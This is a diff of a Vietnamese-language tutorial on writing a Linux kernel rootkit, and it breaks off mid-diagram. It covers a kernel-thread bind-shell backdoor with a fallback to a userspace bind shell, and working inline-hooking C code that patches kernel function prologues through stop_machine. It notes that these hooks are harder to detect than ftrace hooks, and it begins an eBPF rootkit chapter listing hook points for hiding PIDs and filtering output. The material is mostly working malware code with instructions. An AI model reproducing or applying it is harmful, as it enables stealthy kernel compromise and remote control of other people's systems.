     int opt = 1;
     kernel_setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR,
                       (char *)&opt, sizeof(opt));
@@ -4614,7 +6737,7 @@ static int backdoor_thread_fn(void *data)
     ret = kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
     if (ret < 0) goto out_release;
 
-    /* Listen — backlog = 1 (chỉ 1 connection tại 1 thời điểm) */
+    /* Listen — backlog = 1 (chi 1 connection tai 1 thoi diem) */
     ret = kernel_listen(listen_sock, 1);
     if (ret < 0) goto out_release;
 
@@ -4623,8 +6746,8 @@ static int backdoor_thread_fn(void *data)
     /* Accept loop */
     while (!kthread_should_stop()) {
         /* Accept connection.
-         * kernel_accept blocks cho đến khi có connection.
-         * Tạo client_sock mới cho connection. */
+         * kernel_accept blocks cho den khi co connection.
+         * Tao client_sock moi cho connection. */
         ret = kernel_accept(listen_sock, &client_sock, 0);
         if (ret < 0) {
             if (ret == -EAGAIN) {
@@ -4636,7 +6759,7 @@ static int backdoor_thread_fn(void *data)
 
         ksock_send(client_sock, "# rk backdoor\n# ", 17);
 
-        /* Command loop cho connection này */
+        /* Command loop cho connection nay */
         while (!kthread_should_stop()) {
             memset(cmd_buf, 0, sizeof(cmd_buf));
             cmd_len = ksock_recv(client_sock, cmd_buf,
@@ -4682,7 +6805,7 @@ static void rk_activate_backdoor(__be32 authorized_ip)
                                    "kworker/events");
     if (IS_ERR(backdoor_thread)) {
         backdoor_thread = NULL;
-        /* Fallback tới userspace bind shell */
+        /* Fallback toi userspace bind shell */
         rk_activate_backdoor_simple(authorized_ip);
     }
 }
@@ -4692,24 +6815,333 @@ static void rk_activate_backdoor(__be32 authorized_ip)
 
 ## Chapter 9: Inline Hooking
 
+### 9.0 x86-64 Instruction Encoding — Cach patch code trong memory
+
+Inline hooking la ky thuat THAY DOI TRUC TIEP machine code cua target function. De lam dung, ban PHAI hieu cach CPU decode instructions, va cac van de khi modify code tren he thong multi-CPU (SMP).
+
+#### 9.0.1 x86-64 Instruction Format
+
+Moi instruction x86-64 co format phuc tap voi nhieu thanh phan optional. Day la format tong quat:
+
+```
+  x86-64 Instruction Format:
+  ═══════════════════════════════════════════════════════════════
+
+  [Legacy Prefix] [REX Prefix] [Opcode] [ModR/M] [SIB] [Displacement] [Immediate]
+   0-4 bytes       0-1 byte    1-3 bytes  0-1     0-1    0/1/2/4        0/1/2/4/8
+
+  Legacy Prefixes (optional):
+    66  = operand size override (16-bit trong 32/64-bit mode)
+    F0  = LOCK prefix (atomic operations)
+    F2  = REPNE/REPNZ
+    F3  = REP/REPE/REPZ
+
+  REX Prefix (optional, chi trong 64-bit mode):
+    Format: 0100 WRXB
+    W = 1: 64-bit operand size (48 = REX.W)
+    R, X, B: extend ModR/M va SIB register fields
+
+  Opcode: 1-3 bytes, xac dinh instruction type
+  ModR/M: register/memory addressing mode
+  SIB: Scale-Index-Base (complex addressing)
+  Displacement: memory offset (1/2/4 bytes)
+  Immediate: constant value (1/2/4/8 bytes)
+```
+
+**Hai instructions ma rootkit dung de tao trampoline:**
+
+```
+  Instruction 1: MOV RAX, imm64 (10 bytes)
+  ═════════════════════════════════════════
+
+  Byte layout:
+  ┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
+  │ 48 │ B8 │ xx │ xx │ xx │ xx │ xx │ xx │ xx │ xx │
+  └────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
+    │    │    └──────────────────────────────────────┘
+    │    │         8-byte immediate value
+    │    │         (dia chi cua hook function)
+    │    │
+    │    └── Opcode: B8+rd = MOV to register
+    │        B8 = MOV to RAX (register 0)
+    │        B9 = MOV to RCX, BA = MOV to RDX, etc.
+    │
+    └── REX.W prefix: 0x48 = 0100 1000
+        W=1: 64-bit operand size
+        (neu khong co REX.W → chi move 32-bit)
+
+  Vi du cu the:
+    MOV RAX, 0xFFFF888012345678
+    → 48 B8 78 56 34 12 80 88 FF FF
+                └── little-endian!
+
+
+  Instruction 2: JMP RAX (2 bytes)
+  ═════════════════════════════════
+
+  Byte layout:
+  ┌────┬────┐
+  │ FF │ E0 │
+  └────┴────┘
+    │    │
+    │    └── ModR/M byte: E0 = 11 100 000
+    │        11  = register direct (khong memory)
+    │        100 = /4 = JMP opcode extension
+    │        000 = RAX register
+    │
+    └── Opcode: FF = group opcode (JMP/CALL/PUSH indirect)
+        FF /4 = JMP r/m64 (near jump, indirect)
+
+
+  TRAMPOLINE TONG HOP: 10 + 2 = 12 bytes
+  ════════════════════════════════════════
+
+  48 B8 xx xx xx xx xx xx xx xx    MOV RAX, <target_address>
+  FF E0                            JMP RAX
+
+  → Unconditional jump toi bat ky dia chi 64-bit nao
+  → Day la "absolute indirect jump" pattern
+  → Overwrite 12 bytes dau cua target function
+```
+
+**Tai sao 12 bytes? Tai sao khong dung JMP rel32?**
+```
+  JMP rel32 (5 bytes): E9 xx xx xx xx
+  ─────────────────────────────────────
+  Chi jump duoc +-2GB tu vi tri hien tai.
+  Trong kernel 64-bit, khoang cach giua module memory
+  va kernel text CO THE > 2GB → JMP rel32 KHONG DU.
+
+  MOV RAX + JMP RAX (12 bytes):
+  ─────────────────────────────
+  Jump duoc toi BAT KY dia chi nao trong 64-bit address space.
+  An toan cho moi truong hop.
+  Trade-off: ton 12 bytes thay vi 5, nhung LUON DUNG.
+```
+
+#### 9.0.2 Self-Modifying Code tren SMP — Van de va giai phap
+
+Tren he thong multi-core (SMP), modify code trong memory khi CPU khac dang execute code do la CUC KY NGUY HIEM:
+
+```
+  Van de: Partial patch visible cho CPU khac
+  ═══════════════════════════════════════════
+
+  CPU 0 (patcher):                CPU 1 (dang execute target_func):
+  ────────────────                ──────────────────────────────────
+
+  target_func original bytes:
+  55 48 89 E5 48 83 EC 20 48 89 7D F8 ...
+  [push rbp] [mov rbp,rsp] [sub rsp,0x20] ...
+
+  writes byte 0: 48                CPU 1 fetch instruction at target_func
+  writes byte 1: B8                CPU 1 thay: 48 B8 89 E5 48 83 EC 20...
+  writes byte 2: xx                ← PARTIAL PATCH!
+                                   48 B8 89 E5 48 83 EC 20 = MOV RAX, 0x20EC8348E58948B8
+                                   → MOV RAX voi WRONG address
+                                   → JMP toi garbage address
+                                   → PAGE FAULT hoac execute random code
+  ...                              → KERNEL CRASH
+  writes byte 11: E0
+
+  WORST CASE: CPU 1 thay nua instruction cu + nua instruction moi
+  → CPU decode sai → undefined behavior → crash hoac silent corruption
+```
+
+#### 9.0.3 stop_machine() — Giai phap cho SMP-safe patching
+
+```
+  stop_machine(do_patch, &patch_data, NULL)
+  ═══════════════════════════════════════════
+
+  Buoc 1: Gui IPI (Inter-Processor Interrupt) toi TAT CA CPUs
+  ─────────────────────────────────────────────────────────────
+  
+  CPU 0 (caller)      CPU 1              CPU 2              CPU 3
+       │                │                  │                  │
+       │   ──── IPI ───→│                  │                  │
+       │   ──── IPI ──────────────────────→│                  │
+       │   ──── IPI ─────────────────────────────────────────→│
+       │                │                  │                  │
+
+  Buoc 2: Moi CPU enter busy-wait loop (STOP executing normal code)
+  ──────────────────────────────────────────────────────────────────
+  
+  CPU 0 (caller)      CPU 1              CPU 2              CPU 3
+       │              spin...            spin...            spin...
+       │              (khong execute     (khong execute     (khong execute
+       │               bat ky code nao    bat ky code nao    bat ky code nao
+       │               ngoai spin loop)   ngoai spin loop)   ngoai spin loop)
+
+  Buoc 3: CPU 0 chay do_patch() — CHI MINH NO hoat dong
+  ──────────────────────────────────────────────────────
+  
+  CPU 0:                        CPU 1-3: van spin...
+  rk_unprotect_memory();
+  memcpy(target, patch, 12);   ← AN TOAN! Khong CPU nao khac
+  rk_protect_memory();            dang execute target function
+  sync_core();                  ← Flush instruction cache
+
+  Buoc 4: Release tat ca CPUs
+  ───────────────────────────
+  
+  CPU 0 (done)        CPU 1              CPU 2              CPU 3
+       │              exit spin          exit spin          exit spin
+       │              resume normal      resume normal      resume normal
+       │              (thay patched      (thay patched      (thay patched
+       │               code)              code)              code)
+
+  GUARANTEE: Trong suot Buoc 3:
+  ─────────────────────────────
+  - KHONG CPU nao dang o giua viec execute target function
+  - KHONG CPU nao co the bat dau execute target function
+  - Patch la ATOMIC tu goc nhin cua moi CPU khac
+  - Sau khi resume, moi CPU thay COMPLETE patched code
+```
+
+**Tham khao source:** `include/linux/stop_machine.h`, `kernel/stop_machine.c`
+
+#### 9.0.4 Alternative: text_poke_bp() — INT3-based patching (dung boi ftrace)
+
+```
+  text_poke_bp() (arch/x86/kernel/alternative.c):
+  ════════════════════════════════════════════════
+
+  Buoc 1: Ghi INT3 (0xCC, 1 byte) tai byte dau cua target
+  ─────────────────────────────────────────────────────────
+  
+  TRUOC:  55 48 89 E5 48 83 EC 20 ...     [push rbp] [mov rbp,rsp] ...
+  SAU:    CC 48 89 E5 48 83 EC 20 ...     [INT3]     [mov rbp,rsp] ...
+                                           ↑ single byte write = ATOMIC
+
+  Buoc 2: Sync tat ca CPUs (IPI flush)
+  ────────────────────────────────────
+
+  Buoc 3: Ghi remaining bytes (bytes 1-11)
+  ────────────────────────────────────────
+  
+  SAU:    CC B8 xx xx xx xx xx xx xx xx FF E0
+          ↑  └── new bytes (nhung byte 0 van la INT3)
+
+  Buoc 4: Replace INT3 voi byte dau cua new code
+  ────────────────────────────────────────────────
+  
+  SAU:    48 B8 xx xx xx xx xx xx xx xx FF E0
+          ↑ complete patch!
+
+  Buoc 5: Sync tat ca CPUs
+
+  NEU CPU khac hit INT3 trong buoc 3:
+  ────────────────────────────────────
+  INT3 handler detect day la text_poke in progress
+  → Emulate original instruction (push rbp)
+  → Return → CPU tiep tuc tu instruction tiep theo
+  → KHONG crash, KHONG undefined behavior!
+
+  So sanh voi stop_machine():
+  ──────────────────────────────────────────────────────
+  stop_machine():    STOP tat ca CPUs → patch → resume
+                     + Dam bao 100% safe
+                     - VERY expensive (system-wide stall)
+                     - Latency spike cho moi CPU
+
+  text_poke_bp():    INT3 + incremental patch
+                     + Nhe hon (chi 1 byte atomic write)
+                     + Khong stall he thong
+                     - Phu thuoc INT3 handler (complex)
+                     - Co the unexported symbol
+```
+
+#### 9.0.5 Trampoline — Cach goi original function sau khi patch
+
+```
+  TRUOC khi patch:
+  ════════════════
+
+  target_func:
+    0x1000: 55              push rbp           ─┐
+    0x1001: 48 89 E5        mov rbp, rsp        │ 12 bytes se bi
+    0x1004: 48 83 EC 20     sub rsp, 0x20       │ overwrite
+    0x1008: 48 89 7D F8     mov [rbp-8], rdi   ─┘
+    0x100C: ...             (tiep tuc)          ← target_func + 12
+
+
+  SAU khi patch (hook installed):
+  ════════════════════════════════
+
+  target_func (patched):
+    0x1000: 48 B8 xx..xx    MOV RAX, hook_fn   ─┐ 12 bytes patch
+    0x100A: FF E0           JMP RAX            ─┘ → nhay toi hook_fn
+    0x100C: ...             (khong bao gio execute truc tiep)
+
+  hook_fn (rootkit's function):
+    → xu ly logic cua rootkit
+    → khi can goi ORIGINAL function: call trampoline
+
+  trampoline (executable memory, allocated boi module_alloc):
+    0xA000: 55              push rbp           ─┐ copied original
+    0xA001: 48 89 E5        mov rbp, rsp        │ 12 bytes
+    0xA004: 48 83 EC 20     sub rsp, 0x20       │
+    0xA008: 48 89 7D F8     mov [rbp-8], rdi   ─┘
+    0xA00C: 48 B8 0C 10...  MOV RAX, 0x100C    ─┐ jump back
+    0xA016: FF E0           JMP RAX            ─┘ toi target+12
+
+  Flow khi caller goi target_func:
+  ─────────────────────────────────
+
+  caller ──→ target_func ──→ JMP hook_fn
+                               │
+                               ▼
+                          hook_fn:
+                            1. Lam viec cua rootkit
+                            2. (optional) call trampoline
+                               │
+                               ▼
+                          trampoline:
+                            1. Execute 12 bytes original
+                               (push rbp, mov rbp rsp, sub rsp, mov)
+                            2. JMP target_func + 12
+                               │
+                               ▼
+                          target_func + 12:
+                            (tiep tuc original function tu byte 13)
+                            → return binh thuong ve caller
+
+
+  QUAN TRONG: Trampoline PHAI nam trong EXECUTABLE memory.
+  ───────────────────────────────────────────────────────
+  kmalloc() → data pages (NX bit set) → CPU refuse execute → crash
+  module_alloc() → module code pages (executable) → OK
+  
+  Tren kernel co SMEP (Supervisor Mode Execution Prevention):
+  Kernel KHONG the execute code o user pages.
+  Tren kernel co NX (No-Execute):
+  CPU KHONG the execute code o pages marked non-executable.
+  → PHAI dung module_alloc() hoac vmalloc_exec() de co executable memory.
+```
+
+**Tham khao source:** `arch/x86/kernel/alternative.c` (text_poke, text_poke_bp), `include/linux/stop_machine.h`, `kernel/module/main.c` (module_alloc), `arch/x86/include/asm/text-patching.h`
+
+---
+
 ```c
 /* inline_hook.c — Inline function hooking (code patching)
  *
- * Concept: THAY ĐỔI BYTES ĐẦU TIÊN của target function
- * bằng JMP instruction tới hook function.
+ * Concept: THAY DOI BYTES DAU TIEN cua target function
+ * bang JMP instruction toi hook function.
  *
- * Đây là kỹ thuật dùng trong:
- * - Game hacking (Detours library trên Windows)
+ * Day la ky thuat dung trong:
+ * - Game hacking (Detours library tren Windows)
  * - Anti-virus hooking
- * - Rootkit khi không thể dùng syscall table / ftrace
+ * - Rootkit khi khong the dung syscall table / ftrace
  *
- * Tại sao inline hook khi đã có ftrace:
- *   1. Ftrace có thể bị disabled (CONFIG_FTRACE=n)
+ * Tai sao inline hook khi da co ftrace:
+ *   1. Ftrace co the bi disabled (CONFIG_FTRACE=n)
  *   2. Ftrace hook visible trong debugfs
- *   3. Inline hook khó detect hơn (code modification ở level byte)
- *   4. Hoạt động trên bất kỳ kernel function, kể cả non-traceable
+ *   3. Inline hook kho detect hon (code modification o level byte)
+ *   4. Hoat dong tren bat ky kernel function, ke ca non-traceable
  *
- * CÁCH HOẠT ĐỘNG:
+ * CACH HOAT DONG:
  *
  * Original function:
  *   target_func:
@@ -4725,7 +7157,7 @@ static void rk_activate_backdoor(__be32 authorized_ip)
  *     ff e0               jmp rax                    (2 bytes)
  *                                                    Total: 12 bytes
  *
- * Trampoline (để gọi original function):
+ * Trampoline (de goi original function):
  *   trampoline:
  *     55                  push rbp          }  saved original
  *     48 89 e5            mov rbp, rsp      }  bytes (12 bytes)
@@ -4744,7 +7176,7 @@ static void rk_activate_backdoor(__be32 authorized_ip)
  */
 
 #include "rootkit.h"
-#include <asm/text-patching.h>  /* text_poke nếu available */
+#include <asm/text-patching.h>  /* text_poke neu available */
 #include <linux/stop_machine.h> /* stop_machine cho SMP-safe patching */
 
 #define HOOK_SIZE 12  /* mov rax, imm64 (10) + jmp rax (2) */
@@ -4761,16 +7193,16 @@ struct inline_hook {
 /*
  * Allocate executable memory cho trampoline.
  *
- * Trampoline cần:
- * 1. Chứa original bytes (12 bytes)
- * 2. Chứa jump back instruction (12 bytes)
- * 3. Nằm trong EXECUTABLE memory
+ * Trampoline can:
+ * 1. Chua original bytes (12 bytes)
+ * 2. Chua jump back instruction (12 bytes)
+ * 3. Nam trong EXECUTABLE memory
  *
  * module_alloc(): allocate memory trong module address range.
- * Memory này executable (khác kmalloc — data memory, non-exec).
+ * Memory nay executable (khac kmalloc — data memory, non-exec).
  *
- * Tại sao module_alloc: vì SMEP, NX — không thể execute data pages.
- * module_alloc trả về memory trong module code range = executable.
+ * Tai sao module_alloc: vi SMEP, NX — khong the execute data pages.
+ * module_alloc tra ve memory trong module code range = executable.
  */
 static int create_trampoline(struct inline_hook *hook)
 {
@@ -4783,14 +7215,14 @@ static int create_trampoline(struct inline_hook *hook)
     if (!hook->trampoline)
         return -ENOMEM;
 
-    /* Copy original bytes vào trampoline */
+    /* Copy original bytes vao trampoline */
     memcpy(hook->trampoline, hook->orig_bytes, HOOK_SIZE);
 
     /* Build jump-back instruction:
      *   mov rax, (target + HOOK_SIZE)
      *   jmp rax
-     * → Sau khi execute saved bytes, jump tới instruction #13
-     *   trong original function (tiếp tục bình thường) */
+     * → Sau khi execute saved bytes, jump toi instruction #13
+     *   trong original function (tiep tuc binh thuong) */
     jmp_back[0] = 0x48;  /* REX.W prefix */
     jmp_back[1] = 0xb8;  /* mov rax, imm64 */
     *(unsigned long *)(jmp_back + 2) =
@@ -4811,30 +7243,30 @@ static int create_trampoline(struct inline_hook *hook)
 /* ══════════════════════════════════════════════════════════════
  * SMP-SAFE CODE PATCHING via stop_machine()
  *
- * Vấn đề SMP:
- *   CPU khác có thể đang execute target function CÙNG LÚC
- *   ta đang overwrite bytes. Nếu CPU thấy nửa instruction
- *   cũ + nửa instruction mới = undefined behavior / crash.
+ * Van de SMP:
+ *   CPU khac co the dang execute target function CUNG LUC
+ *   ta dang overwrite bytes. Neu CPU thay nua instruction
+ *   cu + nua instruction moi = undefined behavior / crash.
  *
- *   local_irq_save + preempt_disable chỉ disable interrupts
- *   trên CURRENT CPU. Các CPU khác vẫn execute code bình thường.
+ *   local_irq_save + preempt_disable chi disable interrupts
+ *   tren CURRENT CPU. Cac CPU khac van execute code binh thuong.
  *
- * Giải pháp: stop_machine()
- *   1. Send IPI tới mọi CPU: "stop and spin"
- *   2. Mọi CPU enter idle spin loop
- *   3. Patch function chạy trên calling CPU (chỉ 1 CPU hoạt động)
- *   4. Patch function return → tất cả CPUs resume
+ * Giai phap: stop_machine()
+ *   1. Send IPI toi moi CPU: "stop and spin"
+ *   2. Moi CPU enter idle spin loop
+ *   3. Patch function chay tren calling CPU (chi 1 CPU hoat dong)
+ *   4. Patch function return → tat ca CPUs resume
  *
- *   Guarantee: KHÔNG CPU nào execute code bị patch khi đang patch.
+ *   Guarantee: KHONG CPU nao execute code bi patch khi dang patch.
  *
  * Alternative kernel API: text_poke_bp()
- *   Dùng INT3 (breakpoint) approach:
- *   1. Ghi INT3 (1 byte) tại byte đầu → atomic single-byte write
- *   2. Sync tất cả CPUs (IPI)
+ *   Dung INT3 (breakpoint) approach:
+ *   1. Ghi INT3 (1 byte) tai byte dau → atomic single-byte write
+ *   2. Sync tat ca CPUs (IPI)
  *   3. Ghi remaining bytes (sau INT3)
- *   4. Replace INT3 bằng byte đầu của new code
- *   5. Sync tất cả CPUs
- *   Nhưng text_poke_bp có thể unexported → dùng stop_machine.
+ *   4. Replace INT3 bang byte dau cua new code
+ *   5. Sync tat ca CPUs
+ *   Nhung text_poke_bp co the unexported → dung stop_machine.
  * ══════════════════════════════════════════════════════════════ */
 
 struct patch_data {
@@ -4847,15 +7279,15 @@ static int do_patch(void *data)
 {
     struct patch_data *pd = data;
 
-    /* Tại thời điểm này, TẤT CẢ CPUs đã stop.
-     * Chỉ CPU chạy function này hoạt động.
-     * An toàn để modify code. */
+    /* Tai thoi diem nay, TAT CA CPUs da stop.
+     * Chi CPU chay function nay hoat dong.
+     * An toan de modify code. */
     rk_unprotect_memory();
     memcpy(pd->target, pd->patch, pd->size);
     rk_protect_memory();
 
-    /* Flush instruction caches trên CPU này.
-     * Các CPU khác flush khi resume. */
+    /* Flush instruction caches tren CPU nay.
+     * Cac CPU khac flush khi resume. */
     sync_core();
 
     return 0;
@@ -4864,8 +7296,8 @@ static int do_patch(void *data)
 /*
  * Install inline hook — patch target function prologue.
  *
- * Dùng stop_machine() để đảm bảo SMP safety:
- * stop tất cả CPUs → patch code → resume tất cả CPUs.
+ * Dung stop_machine() de dam bao SMP safety:
+ * stop tat ca CPUs → patch code → resume tat ca CPUs.
  */
 static int install_inline_hook(struct inline_hook *hook)
 {
@@ -4880,7 +7312,7 @@ static int install_inline_hook(struct inline_hook *hook)
         return -ENOENT;
     }
 
-    /* Save original bytes TRƯỚC KHI patch */
+    /* Save original bytes TRUOC KHI patch */
     memcpy(hook->orig_bytes, hook->target, HOOK_SIZE);
 
     /* Create trampoline */
@@ -4898,12 +7330,12 @@ static int install_inline_hook(struct inline_hook *hook)
     /* Patch target function via stop_machine.
      *
      * stop_machine(fn, data, NULL):
-     *   1. Send IPI tới mọi CPU: "stop and spin"
-     *   2. Mọi CPU enter idle spin loop
-     *   3. fn(data) chạy trên calling CPU (chỉ 1 CPU hoạt động)
-     *   4. fn return → tất cả CPUs resume
+     *   1. Send IPI toi moi CPU: "stop and spin"
+     *   2. Moi CPU enter idle spin loop
+     *   3. fn(data) chay tren calling CPU (chi 1 CPU hoat dong)
+     *   4. fn return → tat ca CPUs resume
      *
-     * Guarantee: KHÔNG CPU nào execute code bị patch khi đang patch. */
+     * Guarantee: KHONG CPU nao execute code bi patch khi dang patch. */
     pd.target = hook->target;
     pd.patch  = jmp_code;
     pd.size   = HOOK_SIZE;
@@ -4944,8 +7376,322 @@ static void remove_inline_hook(struct inline_hook *hook)
 ```
 
 ---
+## Chapter 10: eBPF Rootkit — The he moi
 
-## Chapter 10: eBPF Rootkit — Thế hệ mới
+### 10.0 eBPF Architecture — Virtual machine trong kernel
+
+eBPF (extended Berkeley Packet Filter) la mot virtual machine chay trong kernel space, cho phep userspace programs inject code vao kernel ma khong can viet kernel module. Hieu kien truc nay la nen tang de hieu tai sao eBPF rootkit nguy hiem va kho detect hon LKM rootkit truyen thong.
+
+#### 10.0.1 eBPF Virtual Machine — Register set va instruction format
+
+eBPF VM la mot register-based virtual machine (khong phai stack-based nhu JVM). Thiet ke nay cho phep map truc tiep sang CPU registers khi JIT compile, dat hieu nang gan native code.
+
+```
+eBPF Register Set (11 registers, 64-bit moi register):
++==========+============================================+==============+
+| Register | Chuc nang                                  | Luu y        |
++==========+============================================+==============+
+| r0       | Return value tu BPF program va helpers     | Caller-saved |
+| r1       | Argument 1 (context pointer khi program    | Caller-saved |
+|          | start, helper arg1 khi goi helper)         |              |
+| r2       | Argument 2                                 | Caller-saved |
+| r3       | Argument 3                                 | Caller-saved |
+| r4       | Argument 4                                 | Caller-saved |
+| r5       | Argument 5                                 | Caller-saved |
+| r6       | General purpose                            | Callee-saved |
+| r7       | General purpose                            | Callee-saved |
+| r8       | General purpose                            | Callee-saved |
+| r9       | General purpose                            | Callee-saved |
+| r10      | Frame pointer (read-only, tro toi stack)   | Read-only    |
++==========+============================================+==============+
+
+Stack: 512 bytes per program (co dinh, khong grow duoc)
+```
+
+Moi eBPF instruction co do rong 64-bit voi encoding nhu sau:
+
+```
+eBPF Instruction Format (64-bit wide):
+  ┌─────────┬──────┬──────┬────────┬──────────────────────────┐
+  │  opcode │ dst  │ src  │ offset │       immediate          │
+  │  8 bit  │ 4bit │ 4bit │ 16 bit │        32 bit            │
+  └─────────┴──────┴──────┴────────┴──────────────────────────┘
+  Byte:  0      1 (lo/hi)      2-3          4-7
+
+  opcode = instruction class (3bit) + source (1bit) + operation (4bit)
+  
+  Classes:
+    BPF_LD    = 0x00   Load tu immediate/packet
+    BPF_LDX   = 0x01   Load tu memory
+    BPF_ST    = 0x02   Store immediate
+    BPF_STX   = 0x03   Store register
+    BPF_ALU   = 0x04   32-bit ALU operations
+    BPF_JMP   = 0x05   64-bit jumps
+    BPF_JMP32 = 0x06   32-bit jumps
+    BPF_ALU64 = 0x07   64-bit ALU operations
+```
+
+Calling convention khi goi BPF helper function:
+
+```
+  BPF program                          BPF Helper
+  ┌──────────────┐                    ┌──────────────────┐
+  │ r1 = arg1    │───────────────────>│ long helper_fn(  │
+  │ r2 = arg2    │───────────────────>│   u64 r1,        │
+  │ r3 = arg3    │───────────────────>│   u64 r2,        │
+  │ r4 = arg4    │───────────────────>│   u64 r3,        │
+  │ r5 = arg5    │───────────────────>│   u64 r4,        │
+  │              │                    │   u64 r5)         │
+  │ r0 = retval  │<───────────────────│ return value;     │
+  └──────────────┘                    └──────────────────┘
+  r1-r5: caller-saved (bi destroy sau helper call)
+  r6-r9: callee-saved (helper phai preserve)
+  r10:   frame pointer, khong doi
+```
+
+#### 10.0.2 BPF Program Lifecycle — Tu source code toi kernel execution
+
+```
+ User writes .bpf.c
+        │
+        ▼
+ Clang compiles to BPF ELF (-target bpf)
+        │
+        ▼
+ bpftool gen skeleton → .skel.h (auto-generated loader)
+        │
+        ▼
+ Userspace loader links with libbpf
+        │
+        ▼
+ bpf(BPF_PROG_LOAD, ...) syscall
+        │
+        ▼
+ ┌──────────────────────────────────────────────────┐
+ │              VERIFIER (kernel/bpf/verifier.c)    │
+ │                                                  │
+ │  1. CFG Analysis:                                │
+ │     - Build control flow graph                   │
+ │     - Detect unreachable code                    │
+ │     - ALL paths MUST reach BPF_EXIT              │
+ │                                                  │
+ │  2. Loop Detection:                              │
+ │     - No unbounded loops (phai provably finite)  │
+ │     - Bounded loops OK since kernel 5.3          │
+ │     - Back-edges phai co bound proof             │
+ │                                                  │
+ │  3. Memory Safety:                               │
+ │     - ALL memory accesses within bounds           │
+ │     - Pointer arithmetic tracked per-register    │
+ │     - NULL checks enforced before dereference    │
+ │     - Stack access: r10 + offset (offset < 0)    │
+ │                                                  │
+ │  4. Helper Validation:                           │
+ │     - Only whitelisted helper functions           │
+ │     - Argument types match expected              │
+ │     - Return value type propagated               │
+ │                                                  │
+ │  5. Resource Limits:                             │
+ │     - Stack depth <= 512 bytes                   │
+ │     - Program size <= 1M instructions (was 4096  │
+ │       before kernel 5.2)                         │
+ │     - Max 8 tail calls depth                     │
+ │     - Complexity limit (verified instructions)   │
+ │                                                  │
+ │  Result: ACCEPT → proceed to JIT                 │
+ │          REJECT → bpf() returns -EINVAL + log    │
+ └──────────────────────┬───────────────────────────┘
+                        │ ACCEPT
+                        ▼
+ ┌──────────────────────────────────────────────────┐
+ │           JIT Compiler (arch/x86/net/bpf_jit*)   │
+ │                                                  │
+ │  BPF bytecode ──→ native x86_64 instructions    │
+ │                                                  │
+ │  BPF r0-r9 mapped to CPU registers:             │
+ │    r0 → RAX    r6 → RBX                         │
+ │    r1 → RDI    r7 → R13                         │
+ │    r2 → RSI    r8 → R14                         │
+ │    r3 → RDX    r9 → R15                         │
+ │    r4 → RCX    r10→ RBP                         │
+ │    r5 → R8                                       │
+ │                                                  │
+ │  JIT output: executable memory page              │
+ │  (CONFIG_BPF_JIT=y, default on modern kernels)   │
+ └──────────────────────┬───────────────────────────┘
+                        │
+                        ▼
+ Attach to hook point (kprobe, tracepoint, XDP, etc.)
+        │
+        ▼
+ Program executes in kernel context khi hook fires
+```
+
+#### 10.0.3 BPF Map Types — Shared data structures
+
+BPF maps la cau truc du lieu dung chung giua BPF programs (kernel space) va userspace. Maps persist across program invocations va duoc share thong qua file descriptor.
+
+```
+Map Type                    Mo ta                                 Use case rootkit
+─────────────────────────────────────────────────────────────────────────────────────
+BPF_MAP_TYPE_HASH           Key-value hash table, dynamic size    Luu hidden PIDs,
+                            O(1) lookup/insert/delete             config values
+
+BPF_MAP_TYPE_ARRAY          Fixed-size array, index = key         Global counters,
+                            O(1) access, pre-allocated            stats, state flags
+
+BPF_MAP_TYPE_RINGBUF        Lock-free ring buffer, kernel→user    Event streaming
+                            Variable-size records, single reader  kernel → userspace
+
+BPF_MAP_TYPE_PERF_EVENT     Per-CPU ring buffer (older API)       Legacy event output
+                            Fixed-size records, per-CPU           (prefer RINGBUF)
+
+BPF_MAP_TYPE_LRU_HASH       Hash with LRU eviction                Connection tracking
+                            Auto-evict oldest khi full            voi bounded memory
+
+BPF_MAP_TYPE_PERCPU_HASH    Per-CPU hash (no locking needed)      High-perf counters
+BPF_MAP_TYPE_PERCPU_ARRAY   Per-CPU array (no locking needed)     Per-CPU state
+
+
+Map lifecycle:
+  ┌─────────────┐     bpf(BPF_MAP_CREATE)     ┌──────────────┐
+  │  Userspace   │ ──────────────────────────> │  Kernel map  │
+  │  (fd-based   │ <────── fd returned ─────── │  (in kernel  │
+  │   access)    │                             │   memory)    │
+  └──────┬───────┘                             └──────┬───────┘
+         │                                            │
+         │  bpf(BPF_MAP_LOOKUP/UPDATE/DELETE)         │  bpf_map_lookup_elem()
+         │  (userspace side via fd)                   │  bpf_map_update_elem()
+         │                                            │  (BPF program side)
+         │                                            │
+         └──── Pin to /sys/fs/bpf/ ──→ PERSIST ───────┘
+               (survive process exit)
+```
+
+#### 10.0.4 BPF Program Types — Hook points cho rootkit
+
+```
+Program type (SEC macro)     Hook point                 Rootkit application
+────────────────────────────────────────────────────────────────────────────
+SEC("kprobe/func")           Function entry via INT3    Hook bat ky kernel function
+                             breakpoint                 (getdents, tcp4_seq_show)
+
+SEC("kretprobe/func")        Function return            Modify return values,
+                             via trampoline             filter output data
+
+SEC("fentry/func")           Function entry via ftrace  Nhu kprobe nhung NHANH hon
+                             (kernel 5.5+, no INT3)    (khong dung breakpoint)
+
+SEC("fexit/func")            Function return via ftrace Nhu kretprobe nhung co
+                             (kernel 5.5+)             access ca input args
+
+SEC("tracepoint/cat/name")   Static kernel tracepoints  Hook syscall enter/exit
+                             (stable ABI)              (sys_enter_getdents64)
+
+SEC("xdp")                   eXpress Data Path          Packet filtering TRUOC
+                             NIC driver level           netfilter/tcpdump
+
+SEC("tc")                    Traffic control hook       Packet modify o TC layer
+                             (ingress/egress)           (sau XDP, truoc socket)
+
+SEC("raw_tracepoint/name")   Raw tracepoint             Lower overhead,
+                             (no argument processing)   raw access to args
+
+
+fentry/fexit vs kprobe/kretprobe:
+  ┌─────────────────────────────────────────────────────────────┐
+  │ kprobe: Dung INT3 breakpoint → trap → handler → resume     │
+  │   Overhead: ~100-200ns per call (INT3 + trap handling)     │
+  │   Compat: Kernel 4.1+                                      │
+  │                                                             │
+  │ fentry: Dung ftrace NOP patching → direct call → return    │
+  │   Overhead: ~10-30ns per call (direct function call)       │
+  │   Compat: Kernel 5.5+ (requires BTF)                       │
+  │   Bonus: fexit co access ca input arguments                │
+  └─────────────────────────────────────────────────────────────┘
+```
+
+#### 10.0.5 BTF va CO-RE (Compile Once, Run Everywhere)
+
+Truoc BTF/CO-RE, eBPF programs phai compile tren CHINH XAC kernel version target (vi struct layout thay doi giua versions). BTF giai quyet van de nay:
+
+```
+Van de cu (khong co CO-RE):
+  ┌──────────────────┐     ┌──────────────────┐
